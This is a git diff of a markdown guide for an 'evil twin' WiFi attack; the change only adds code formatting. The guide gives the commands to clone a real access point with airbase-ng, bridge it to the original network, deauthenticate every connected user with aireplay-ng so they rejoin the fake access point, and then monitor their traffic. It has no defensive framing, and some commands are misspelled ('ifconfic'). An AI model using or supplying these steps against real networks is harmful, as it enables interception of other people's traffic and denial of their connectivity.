@@ -8,12 +8,13 @@ Environment: NIC with monitor mode capabilities
 1. Enable monitor mode in NIC
 - Take down the internet facing interface: ifconfic INTERFACE down
 - Enable monitor mode: iwconfig INTERFACE mode monitor
-- Kill all processes that might conflict with aircrack: airmon-ng check INTERFACE, kill PID
+- Kill all processes that might conflict with aircrack: `airmon-ng check INTERFACE`, kill PID
 
 2. Set up fake Access Point
-- Retrieve network parameters of WiFI access point: airodump-ng INTERFACE
-- Create fake Access Point: airbase-ng -a MAC --essid SSID -c CHANNEL INTERFACE
+- Retrieve network parameters of WiFI access point: `airodump-ng INTERFACE`
+- Create fake Access Point: `airbase-ng -a MAC --essid SSID -c CHANNEL INTERFACE`
 - Setup internet redirection from evil access point to original access point:
+
 ```bash
       brctl addbr EVIL
       brctl addif EVIL INTERFACE
@@ -24,7 +25,7 @@ Environment: NIC with monitor mode capabilities
 ```
 
 3. Force every user to connect to Evil Access Point
-- Deauthenticate everyone connected to original Access Point: aireplay-ng --deauth 0 -a MAC INTERFACE
+- Deauthenticate everyone connected to original Access Point: `aireplay-ng --deauth 0 -a MAC INTERFACE`
 - USers will automastically attempt connectionto Evil Access Point
 
 4. Monitor traffic
